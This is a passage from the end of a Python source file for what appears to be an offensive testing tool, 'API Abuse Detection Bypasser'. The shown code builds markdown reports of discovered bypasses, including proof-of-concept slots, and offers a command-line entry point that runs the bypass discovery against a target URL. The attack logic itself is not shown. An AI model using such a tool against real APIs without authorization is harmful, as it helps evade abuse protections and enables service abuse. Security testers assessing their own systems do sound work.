**Severity**: {bypass.severity.value} | **Confidence**: {bypass.confidence * 100:.0f}% | **Category**: {bypass.category.value}

**Description**: {bypass.description}

**Bypass Technique**: {bypass.bypass_technique}

**Endpoint**: {bypass.endpoint}

**Impact**: {bypass.impact}

**Recommendation**: {bypass.recommendation}

**Evidence**:
"""
            for evidence in bypass.evidence:
                report += f"- {evidence}\n"

            if bypass.poc_code:
                report += f"\n**Proof of Concept**:\n```python\n{bypass.poc_code}\n```\n"

            report += "\n---\n\n"

        return report

    def get_findings_by_severity(self, severity: BypassSeverity) -> List[BypassVulnerability]:
        """Get findings filtered by severity."""
        return [f for f in self.discovered_bypasses if f.severity == severity]

    def get_findings_by_category(self, category: BypassCategory) -> List[BypassVulnerability]:
        """Get findings filtered by category."""
        return [f for f in self.discovered_bypasses if f.category == category]


# ============================================================================
# CLI Interface
# ============================================================================

def main():
    """Main CLI execution."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python api_abuse_detection_bypasser.py <target_url>")
        print("Example: python api_abuse_detection_bypasser.py https://api.example.com")
        sys.exit(1)

    target = sys.argv[1]

    print(f"[*] API Abuse Detection Bypasser v3.0.0")
    print(f"[*] Target: {target}\n")

    bypasser = APIAbuseDetectionBypasser(target)

    try:
        bypasses = bypasser.discover_all_bypasses()

        print(f"\n[+] Discovered {len(bypasses)} bypass vulnerabilities\n")

        # Print summary
        for bypass in bypasses:
            severity_marker = {
                'CRITICAL': '🔴',
                'HIGH': '🟠',
                'MEDIUM': '🟡',
                'LOW': '🔵',
                'INFO': '⚪'
            }.get(bypass.severity.value, '⚪')

            print(f"{severity_marker} {bypass.vuln_id}: {bypass.name} ({bypass.severity.value})")

        # Generate report
        report = bypasser.generate_report()
        filename = f"abuse-bypass-report-{datetime.now().strftime('%Y%m%d-%H%M%S')}.md"

        with open(filename, 'w') as f:
            f.write(report)

        print(f"\n[+] Full report saved to {filename}")

    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
